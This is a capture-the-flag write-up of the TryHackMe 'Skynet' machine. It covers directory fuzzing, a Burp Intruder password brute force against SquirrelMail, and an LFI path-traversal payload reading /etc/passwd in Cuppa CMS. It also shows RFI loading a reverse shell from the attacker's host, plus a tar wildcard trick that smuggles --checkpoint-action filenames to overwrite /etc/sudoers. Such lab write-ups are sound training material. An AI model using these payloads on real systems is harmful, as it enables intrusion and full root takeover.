
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-1.png)

Http service on port 80 reveals a page with a search which does nothing.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-2.png)

In that case, i decided to find some hidden directories using ffuf.
```text

./ffuf -u http://10.10.150.216/FUZZ -w /usr/share/wordlists/dirb/common.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.150.216/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 523, Words: 26, Lines: 19]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
config                  [Status: 301, Size: 315, Words: 20, Lines: 10]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 523, Words: 26, Lines: 19]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
squirrelmail            [Status: 301, Size: 321, Words: 20, Lines: 10]
:: Progress: [4615/4615] :: Job [1/1] :: 384 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

The /squirrelmail has a login form.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-3.png)
I didn't knew any username or password, but i had plenty of services to enumerate. The smb share has a folder which can be read by anyone.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-4.png)

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-5.png)

The anonymous folder has a file which may be useful.

```text
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

In the /logs folder, the log1.txt contains a list of passwords.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-6.png)  
I captured a request using burp suite and used it's intruder to try every password from the list found.  
```text
POST /squirrelmail/src/redirect.php HTTP/1.1

Host: 10.10.150.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://10.10.150.216
Connection: close
Referer: http://10.10.150.216/squirrelmail/src/login.php
Cookie: squirrelmail_language=en_US
Upgrade-Insecure-Requests: 1


login_username=milesdyson&secretkey=§pass§
```
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-7.png)  
Once logged in, i found 3 emails.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-8.png)  
The first of them has a password which can be used to login to the smb share.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-9.png)  
In his share, i found a file called important.txt
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-10.png)
```text

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
The website at the specified location has this page. It wasn't that useful, but i managed to find some useful directories using ffuf.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-11.png)
```text
./ffuf -u http://10.10.150.216/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirb/common.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.150.216/45kra24zxs28v3yd/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 418, Words: 45, Lines: 16]
administrator           [Status: 301, Size: 339, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 418, Words: 45, Lines: 16]
:: Progress: [4615/4615] :: Job [1/1] :: 307 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```  
/administrator reveals cuppa CMS  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-12.png)

I tried the found credentials, but no luck. I looked for an exploit for this cms and i found it.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-13.png)

I copied the exploit to my folder and read it carefully. Turns out, this cms is vulnerable to LFI and RFI.
```text
cp /usr/share/exploitdb/exploits/php/webapps/25971.txt .
```
I requested the contents of /etc/passwd using the payload below, and i got them.
```text
http://10.10.150.216/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
Because, it is also vulnerable to RFI, i can upload a reverse shell.
```text
1. python3 -m http.server 4444
2. Go to http://10.10.150.216/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.5.181:4444
```
The second GET will appear as i acces the rev.php file  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-14.png)  

Also, the page will list all the files i have in the current directory.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-15.png)  
As i had a reverse shell, i looked into ways to advance in privileges.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-16.png)

In the crontab file i noticed the backup.sh script.

```text
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```

The code of this script is:
```text
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
Using the wildcard alonside tar i can became root. 

```text
www-data@skynet:/var/www/html$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
www-data@skynet:/var/www/html$ echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
www-data@skynet:/var/www/html$ echo "/var/www/html"  > --checkpoint=1

www-data@skynet:/var/www/html$ sudo -l
sudo -l
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
```
